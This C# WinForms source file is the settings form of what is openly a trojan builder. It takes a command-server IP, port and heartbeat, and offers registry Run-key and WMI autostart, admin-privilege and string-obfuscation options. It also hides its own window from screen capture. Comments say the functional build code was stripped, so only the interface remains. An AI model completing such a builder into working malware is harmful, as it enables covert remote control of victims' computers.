using System;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Text.Json;
using System.Text; // Added for Encoding

namespace LMK
{
    public partial class BuilderForm : Form
    {
        private TextBox iconPathTextBox;
        private Button selectIconButton;
        private TextBox trojanNameTextBox;
        private CheckBox autostartRunCheckBox;
        private CheckBox autostartWmiCheckBox;
        private CheckBox persistCheckBox;
        private CheckBox obfuscateCheckBox;
        private Button buildButton;
        private TextBox ipTextBox;
        private TextBox portTextBox;
        private TextBox heartbeatTextBox;
        private static string builderConfigPath = "builder.json";
        private class BuilderConfig
        {
            public string IconPath { get; set; }
            public string Name { get; set; }
            public string IP { get; set; }
            public string Port { get; set; }
            public string Heartbeat { get; set; }
            public bool AutostartRun { get; set; }
            public bool AutostartWmi { get; set; }
            public bool Persist { get; set; } // 新增
        }

        public BuilderForm()
        {
            this.Text = "构建器";
            this.Width = 450;
            this.Height = 380;
            this.MinimumSize = new System.Drawing.Size(450, 380);


            Label iconLabel = new Label() { Text = "选择图标:", Left = 20, Top = 20, Width = 80 };
            iconPathTextBox = new TextBox() { Left = 110, Top = 18, Width = 180, ReadOnly = true };
            selectIconButton = new Button() { Text = "浏览...", Left = 300, Top = 16, Width = 70 };
            selectIconButton.Click += SelectIconButton_Click;

            Label nameLabel = new Label() { Text = "木马名称:", Left = 20, Top = 60, Width = 80 };
            trojanNameTextBox = new TextBox() { Left = 110, Top = 58, Width = 180 };

            Label ipLabel = new Label() { Text = "连接IP:", Left = 20, Top = 100, Width = 80 };
            ipTextBox = new TextBox() { Left = 110, Top = 98, Width = 180 };

            Label portLabel = new Label() { Text = "连接端口:", Left = 20, Top = 140, Width = 80 };
            portTextBox = new TextBox() { Left = 110, Top = 138, Width = 180 };

            Label heartbeatLabel = new Label() { Text = "心跳频率(秒):", Left = 20, Top = 180, Width = 80 };
            heartbeatTextBox = new TextBox() { Left = 110, Top = 178, Width = 180, Text = "3" };

            autostartRunCheckBox = new CheckBox() { Text = "注册表Run项", Left = 20, Top = 220, Width = 120 };
            autostartWmiCheckBox = new CheckBox() { Text = "WMI事件订阅", Left = 150, Top = 220, Width = 120 };
            persistCheckBox = new CheckBox() { Text = "管理员权限", Left = 280, Top = 220, Width = 120 };
            autostartRunCheckBox.CheckedChanged += (s, e) => {
                if (autostartRunCheckBox.Checked) autostartWmiCheckBox.Enabled = false;
                else autostartWmiCheckBox.Enabled = true;
            };
            autostartWmiCheckBox.CheckedChanged += (s, e) => {
                if (autostartWmiCheckBox.Checked) autostartRunCheckBox.Enabled = false;
                else autostartRunCheckBox.Enabled = true;
            };
            obfuscateCheckBox = new CheckBox() { Text = "基础字符串加密", Left = 20, Top = 250, Width = 180 };
            this.Controls.Add(obfuscateCheckBox);
            buildButton = new Button() { Text = "生成", Left = 150, Top = 280, Width = 80 };
            // 移除 BuildClientAsync 相关调用和引用，只保留UI

            this.Controls.Add(iconLabel);
            this.Controls.Add(iconPathTextBox);
            this.Controls.Add(selectIconButton);
            this.Controls.Add(nameLabel);
            this.Controls.Add(trojanNameTextBox);
            this.Controls.Add(ipLabel);
            this.Controls.Add(ipTextBox);
            this.Controls.Add(portLabel);
            this.Controls.Add(portTextBox);
            this.Controls.Add(heartbeatLabel);
            this.Controls.Add(heartbeatTextBox);
            this.Controls.Add(autostartRunCheckBox);
            this.Controls.Add(autostartWmiCheckBox);
            this.Controls.Add(persistCheckBox);
            this.Controls.Add(buildButton);
            LoadBuilderConfig();
        }

        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);
            LMK.WindowAffinityHelper.SetExcludeFromCapture(this);
        }

        private void SelectIconButton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "选择图标文件";
                dlg.Filter = "图标文件 (*.ico;*.png;*.jpg)|*.ico;*.png;*.jpg|所有文件 (*.*)|*.*";
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    iconPathTextBox.Text = dlg.FileName;
                }
            }
        }

        private void LoadBuilderConfig()
        {
            try
            {
                if (File.Exists(builderConfigPath))
                {
                    var json = File.ReadAllText(builderConfigPath);
                    var cfg = JsonSerializer.Deserialize<BuilderConfig>(json);
                    iconPathTextBox.Text = cfg.IconPath;
                    trojanNameTextBox.Text = cfg.Name;
                    ipTextBox.Text = cfg.IP;
                    portTextBox.Text = cfg.Port;
                    heartbeatTextBox.Text = cfg.Heartbeat;
                    autostartRunCheckBox.Checked = cfg.AutostartRun;
                    autostartWmiCheckBox.Checked = cfg.AutostartWmi;
                    persistCheckBox.Checked = cfg.Persist;
                }
            }
            catch { }
        }
        private void SaveBuilderConfig()
        {
            var cfg = new BuilderConfig
            {
                IconPath = iconPathTextBox.Text,
                Name = trojanNameTextBox.Text,
                IP = ipTextBox.Text,
                Port = portTextBox.Text,
                Heartbeat = heartbeatTextBox.Text,
                AutostartRun = autostartRunCheckBox.Checked,
                AutostartWmi = autostartWmiCheckBox.Checked,
                Persist = persistCheckBox.Checked
            };
            var json = JsonSerializer.Serialize(cfg);
            File.WriteAllText(builderConfigPath, json);
        }

        // 只保留UI相关内容，删除所有功能性代码
    }
} 